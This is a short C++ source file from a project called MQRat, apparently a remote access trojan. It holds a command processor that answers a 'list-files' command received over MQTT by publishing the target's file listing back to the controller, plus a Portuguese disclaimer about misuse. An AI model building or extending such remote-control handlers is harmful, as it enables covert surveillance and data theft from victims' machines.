/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#include "command_processor.hpp"
#include "api.hpp"
#include "log.hpp"
#include "mqtt_client.hpp"
#include "utils.hpp"
#include <exception>

CommandProcessor::CommandProcessor(string cmd, void *client)
{
    this->command = cmd;
    this->client = client;
}

void CommandProcessor::Process()
{
    string output = "";
    auto client = static_cast<MqttClient*>(this->client);
    auto send_topic = client->getSendTopic();

    if(command == "list-files") {
        auto files = API::FileSystem::ListFiles();
        client->Publish(files, send_topic);
    } else {
        client->Publish("/error", send_topic);
		Log::LogInfo("Unknown command received");
	}
}
